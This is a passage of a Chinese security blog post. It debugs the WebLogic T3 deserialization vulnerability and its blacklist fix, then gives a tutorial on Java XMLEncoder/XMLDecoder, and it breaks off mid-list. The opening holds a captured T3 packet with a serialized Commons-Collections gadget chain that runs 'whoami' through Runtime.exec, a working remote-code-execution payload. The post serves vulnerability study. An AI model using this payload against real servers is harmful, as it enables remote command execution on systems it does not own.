<h5 id="第二次交互"><a href="#第二次交互" class="headerlink" title="第二次交互"></a>第二次交互</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">发送数据</span><br><span class="line">.....e............i...`....N..]...&#123;_..Mz.x...M...mg.ysr.xr.xr.xp...</span><br><span class="line">.............pppppp...</span><br><span class="line">.............p.........sr.2sun.reflect.annotation.AnnotationInvocationHandlerU.....~....L..memberValuest..Ljava/util/Map;L..typet..Ljava/lang/Class;xps&#125;.....</span><br><span class="line">java.util.Mapxr..java.lang.reflect.Proxy.&#x27;. ..C....L..ht.%Ljava/lang/reflect/InvocationHandler;xpsq.~..sr.*org.apache.commons.collections.map.LazyMapn....y.....L..factoryt.,Lorg/apache/commons/collections/Transformer;xpsr.:org.apache.commons.collections.functors.ChainedTransformer0...(z.....[.</span><br><span class="line">iTransformerst.-[Lorg/apache/commons/collections/Transformer;xpur.-[Lorg.apache.commons.collections.Transformer;.V*..4.....xp....sr.;org.apache.commons.collections.functors.ConstantTransformerXv..A......L.	iConstantt..Ljava/lang/Object;xpvr..java.lang.Runtime...........xpsr.:org.apache.commons.collections.functors.InvokerTransformer...k&#123;|.8...[..iArgst..[Ljava/lang/Object;L..iMethodNamet..Ljava/lang/String;[..iParamTypest..[Ljava/lang/Class;xpur..[Ljava.lang.Object;..X..s)l...xp....t.</span><br><span class="line">getRuntimeur..[Ljava.lang.Class;......Z....xp....t.	getMethoduq.~......vr..java.lang.String...8z;.B...xpvq.~..sq.~..uq.~......puq.~......t..invokeuq.~......vr..java.lang.Object...........xpvq.~..sq.~..ur..[Ljava.lang.String;..V...&#123;G...xp....t..whoamit..execuq.~......q.~.#sq.~..sr..java.lang.Integer.......8...I..valuexr..java.lang.Number...........xp....sr..java.util.HashMap......`....F.</span><br><span class="line">loadFactorI.	thresholdxp?@......w.........xxvr..java.lang.Override...........xpq.~.:</span><br><span class="line"></span><br><span class="line">无接收消息</span><br></pre></td></tr></table></figure>

<p>断点可以达到我们第一次交互结束的else语句里面，处理的网络数据块chunk和抓取的数据包一样。</p>
<p><img src="/./images/image-20240909022257269.png" alt="image-20240909022257269"></p>
<p>进入<code>MsgAbbrevJVMConnection#dispatch</code>，里面会调用<code>MsgAbbrevInputStream#init</code>方法初始化输入流。我们反序列化漏洞就是初始化输入流产生的问题。</p>
<p>首先调用<code>super.init(chunk, 4)</code>，最终前4字节被skip掉。然后调用<code>readHeader</code>方法读取头部信息</p>
<p>关于头部信息的含义，来自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Kr-JDijPCs7u3mZXcRwe9g">Weblogic安全漫谈(一)</a></p>
<blockquote>
<p><code>cmd</code>字节应该是指代通信类型，可以从<code>weblogic/rjvm/JVMMessage</code>类中的变量名看出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;static final byte CMD_UNDEFINED = 0;</span><br><span class="line">&gt;static final byte CMD_IDENTIFY_REQUEST = 1;</span><br><span class="line">&gt;static final byte CMD_IDENTIFY_RESPONSE = 2;</span><br><span class="line">&gt;static final byte CMD_REQUEST_CLOSE = 11;</span><br><span class="line">&gt;static final byte CMD_IDENTIFY_REQUEST_CSHARP = 12;</span><br><span class="line">&gt;static final byte CMD_IDENTIFY_RESPONSE_CSHARP = 13;</span><br><span class="line">&gt;static final byte CMD_NO_ROUTE_IDENTIFY_REQUEST = 9;</span><br><span class="line">&gt;static final byte CMD_TRANSLATED_IDENTIFY_RESPONSE = 10;</span><br><span class="line">&gt;static final byte CMD_PEER_GONE = 3;</span><br><span class="line">&gt;static final byte CMD_ONE_WAY = 4;</span><br><span class="line">&gt;static final byte CMD_REQUEST = 5;</span><br><span class="line">&gt;static final byte CMD_RESPONSE = 6;</span><br><span class="line">&gt;static final byte CMD_ERROR_RESPONSE = 7;</span><br><span class="line">&gt;static final byte CMD_INTERNAL = 8;</span><br></pre></td></tr></table></figure>

<p>没猜到<code>QOS</code>字节的含义，类初始化时被赋为十进制<code>101</code>，所以EXP同样用了这个值。</p>
<p><code>flags</code>字节从后面<code>getFlag</code>方法可以看出用来从二进制位控制<code>hasJVMIDs</code>、<code>hasTX</code>、<code>hasTrace</code>（类比Linux的rwx权限与777）。</p>
<p><code>responseId</code>字节用于标识通信顺序、<code>invokeableId</code>字节用于标识被调用的方法，目前用不到置为初始值-1。</p>
<p><code>abbrevOffset</code>字节顾名思义是abbrev的偏移长度，表示<code>Header</code>结尾处 相距 后面字节流<code>MsgAbbrevs</code>部分的距离，在<code>init</code>方法中会被skip掉，EXP中直接赋0表示没有额外的数据需要跳过。</p>
</blockquote>
<p>第二次skip掉86个字节，加上前面4个，一共skip掉90个字节。</p>
<p><img src="/./images/image-20240909023745466.png" alt="image-20240909023745466"></p>
<p>那么蓝色光标部分就被skip掉了，剩下的数据就是从fe010000开始，这正是weblogic反序列化数据标志，而后续aced0005又正是序列化数据的开头，接下来就是处理反序列化数据的内容了。</p>
<p><img src="/./images/image-20240909024147147.png" alt="image-20240909024147147"></p>
<p>进入到<code>MsgAbbrevJVMConnection#readMsgAbbrevs</code>方法中，会调用<code>InboundMsgAbbrev#read</code>方法，</p>
<p>调用 <code>var1.readLength()</code> 方法，读取一个整数 <code>var3</code>，表示后续需要处理的对象数量，使用 <code>for</code> 循环，遍历每个对象。在每次循环中，调用 <code>var1.readLength()</code> 方法，读取一个整数 <code>var5</code>，表示当前对象的长度或缩略符索引。如果 <code>var5</code> 大于缩略符处理器的容量，则直接读取对象并获取其缩略符，然后将对象存入内部数据结构；否则，通过缩略符索引还原对象并存入内部数据结构。</p>
<p>要进入readObject分支，就需要var5 &gt; var2.getCapacity()。var5固定等于256，var2.getCapacity()是第一次交互中发送的数据中AS的值，我们当时设置的是255，满足条件，可以进入readObject。</p>
<p><img src="/./images/image-20240909030727153.png" alt="image-20240909030727153"></p>
<p>跟到<code>ObjectInputStream#readOrdinaryObject</code>中，先进入readCLassDesc方法。</p>
<p><img src="/./images/image-20240909033150565.png" alt="image-20240909033150565"></p>
<p>一路跟进至 <code>InboundMsgAbbrev#resolveClass()</code>，这时var1使我们cc链的触发类。</p>
<p><img src="/./images/image-20240909032035019.png" alt="image-20240909032035019"></p>
<p>跟进，这里会Class.forName加载这个类。</p>
<p><img src="/./images/image-20240909032124262.png" alt="image-20240909032124262"></p>
<p>然后回到<code>ObjectInputStream#readOrdinaryObject</code>中，把加载的AnnotationInvocationHandler类初始化一个出来。然后调用readSerialData方法还原。</p>
<p><img src="/./images/image-20240909033210511.png" alt="image-20240909033210511"></p>
<p>反射调用AnnotationInvocationHandler#readObject，当然肯定不是这个AnnotationInvocationHandler对象了，因为这个时候里面的属性还都是null，有兴趣可以自己调试一下，由于第二天有早八先不调了，后面有精力再补，后续就是cc链了。然后到命令执行。</p>
<p><img src="/./images/image-20240909033512760.png" alt="image-20240909033512760"></p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>官方修复如下，通过黑名单限制的。</p>
<p><img src="/./images/BlackList.png" alt="img"></p>
<h2 id="XMLDecoder相关"><a href="#XMLDecoder相关" class="headerlink" title="XMLDecoder相关"></a>XMLDecoder相关</h2><h3 id="XMLEncoder-和-XMLDecoder"><a href="#XMLEncoder-和-XMLDecoder" class="headerlink" title="XMLEncoder 和 XMLDecoder"></a>XMLEncoder 和 XMLDecoder</h3><p>XMLEncoder 和 XMLDecoder 是 Java 的两个类，用于将 Java 对象序列化为 XML 格式以及从 XML 格式反序列化为 Java 对象。这两个类属于 <code>java.beans</code> 包，提供了一种将对象的状态以 XML 格式保存和恢复的机制，方便进行数据交换和持久化处理。</p>
<h4 id="XMLEncoder"><a href="#XMLEncoder" class="headerlink" title="XMLEncoder"></a>XMLEncoder</h4><p><strong>XMLEncoder</strong> 类用于将 Java 对象及其状态序列化为 XML 格式。以下是使用 XMLEncoder 的基本步骤：</p>
<ol>
<li><strong>创建 XMLEncoder 对象</strong>：通常使用一个 OutputStream（如 FileOutputStream）来创建 XMLEncoder 对象。</li>
<li><strong>写入对象</strong>：通过调用 <code>writeObject</code> 方法将对象写入到 XML 编码流中。</li>
<li><strong>关闭编码器</strong>：完成写入后，调用 <code>close</code> 方法关闭编码器并释放资源。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLEncoderExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.xml&quot;</span>);</span><br><span class="line">             <span class="type">XMLEncoder</span> <span class="variable">encoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLEncoder</span>(fos)) &#123;</span><br><span class="line">            <span class="comment">// 创建一个示例对象</span></span><br><span class="line">            <span class="type">MyObject</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>(<span class="string">&quot;example&quot;</span>, <span class="number">123</span>);</span><br><span class="line">            <span class="comment">// 序列化对象到 XML</span></span><br><span class="line">            encoder.writeObject(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObject</span> &#123;  <span class="comment">// 确保类是 public 的</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参构造函数必须是 public</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObject</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 带参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObject</span><span class="params">(String name, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有 getter 和 setter 方法必须是 public</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getValue方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setValue方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行得到如下xml文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_65&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;MyObject&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">int</span>&gt;</span>123<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同时控制台输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getName方法被调用</span><br><span class="line">getName方法被调用</span><br><span class="line">setName方法被调用</span><br><span class="line">getValue方法被调用</span><br><span class="line">getValue方法被调用</span><br><span class="line">getValue方法被调用</span><br><span class="line">setValue方法被调用</span><br></pre></td></tr></table></figure>

<h4 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h4><p><strong>XMLDecoder</strong> 类用于从 XML 格式反序列化回 Java 对象。以下是使用 XMLDecoder 的基本步骤：</p>
<ol>
<li><strong>创建 XMLDecoder 对象</strong>：通常使用一个 InputStream（如 FileInputStream）来创建 XMLDecoder 对象。</li>
<li><strong>读取对象</strong>：通过调用 <code>readObject</code> 方法从 XML 编码流中读取对象。</li>
<li><strong>关闭解码器</strong>：完成读取后，调用 <code>close</code> 方法关闭解码器并释放资源。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLDecoderExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.xml&quot;</span>);</span><br><span class="line">             <span class="type">XMLDecoder</span> <span class="variable">decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(fis)) &#123;</span><br><span class="line">            <span class="comment">// 反序列化对象</span></span><br><span class="line">            <span class="type">MyObject</span> <span class="variable">obj</span> <span class="operator">=</span> (MyObject) decoder.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;Name: &quot;</span> + obj.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;Value: &quot;</span> + obj.getValue());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行控制台输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setName方法被调用</span><br><span class="line">setValue方法被调用</span><br><span class="line">getName方法被调用</span><br><span class="line">Name: example</span><br><span class="line">getValue方法被调用</span><br><span class="line">Value: 123</span><br></pre></td></tr></table></figure>

<p>通过 XMLEncoder 和 XMLDecoder，可以方便地将 Java 对象的状态持久化为 XML 文件，并在需要时恢复这些对象。</p>
<p>XML 本身是一种非常灵活的标记语言，允许用户定义自己的标签和属性。因此，XML 没有预定义的 “所有” 属性标签。但是，在特定的 XML 架构或标准中，如 <code>java.beans.XMLEncoder</code> 和 <code>java.beans.XMLDecoder</code> 使用的 XML 格式，有一些特定的标签和属性是常用的。</p>
<h3 id="常见的-XML-标签和属性"><a href="#常见的-XML-标签和属性" class="headerlink" title="常见的 XML 标签和属性"></a>常见的 XML 标签和属性</h3><h4 id="1-XML-声明"><a href="#1-XML-声明" class="headerlink" title="1. XML 声明"></a>1. XML 声明</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure>

<p>标签和属性：</p>
<ul>
<li><code>version</code>: 指定 XML 版本。</li>
<li><code>encoding</code>: 指定编码方式。</li>
</ul>
<h4 id="2-根元素"><a href="#2-根元素" class="headerlink" title="2. 根元素 &lt;java&gt;"></a>2. 根元素 <code>&lt;java&gt;</code></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_241&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>标签和属性：</p>
<ul>
<li><code>java</code>: 根元素，包含整个 XML 文件结构。</li>
<li><code>version</code>: 指定 Java 版本。</li>
<li><code>class</code>: 指定用于解析的 Java 类。</li>
</ul>
<h4 id="3-对象元素"><a href="#3-对象元素" class="headerlink" title="3. 对象元素 &lt;object&gt;"></a>3. 对象元素 <code>&lt;object&gt;</code></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;com.example.MyObject&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 子元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>标签和属性：</p>
<ul>
<li><code>object</code>: 表示一个 Java 对象。</li>
<li><code>class</code>: 指定对象的类名。</li>
</ul>
<h4 id="4-属性设置"><a href="#4-属性设置" class="headerlink" title="4. 属性设置 &lt;void&gt;"></a>4. 属性设置 <code>&lt;void&gt;</code></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>标签和属性：</p>
<ul>
<li><code>void</code>: 用于调用方法（特别是 setter 方法）。</li>
<li><code>property</code>: 指定要设置的属性名称。</li>
</ul>
<h4 id="5-基本数据类型"><a href="#5-基本数据类型" class="headerlink" title="5. 基本数据类型"></a>5. 基本数据类型</h4><ul>
<li><p><code>&lt;string&gt;</code>: 表示一个字符串值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;int&gt;</code>: 表示一个整数值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">int</span>&gt;</span>123<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;boolean&gt;</code>: 表示一个布尔值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;float&gt;</code>: 表示一个浮点值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">float</span>&gt;</span>3.14<span class="tag">&lt;/<span class="name">float</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;double&gt;</code>: 表示一个双精度浮点值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">double</span>&gt;</span>6.28<span class="tag">&lt;/<span class="name">double</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;long&gt;</code>: 表示一个长整数值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">long</span>&gt;</span>1234567890<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;short&gt;</code>: 表示一个短整数值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">short</span>&gt;</span>123<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;char&gt;</code>: 表示一个字符值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">char</span>&gt;</span>A<span class="tag">&lt;/<span class="name">char</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="6-数组和集合"><a href="#6-数组和集合" class="headerlink" title="6. 数组和集合"></a>6. 数组和集合</h4><ul>
<li><p><code>&lt;array&gt;</code>: 表示一个数组。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;int[]&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">int</span>&gt;</span>2<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;list&gt;</code>: 表示一个列表。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>item1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>item2<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&lt;map&gt;</code>: 表示一个映射（键值对）。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>key1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>value1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>key2<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>value2<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="7-方法调用"><a href="#7-方法调用" class="headerlink" title="7. 方法调用"></a>7. 方法调用</h4><ul>
<li><p><code>&lt;void method=&quot;methodName&quot;&gt;</code>: 表示调用任意方法。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;someMethod&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">int</span>&gt;</span>10<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="8-Null-值"><a href="#8-Null-值" class="headerlink" title="8. Null 值"></a>8. Null 值</h4><ul>
<li><p><code>&lt;null&gt;</code>: 表示一个 null 值。</p>
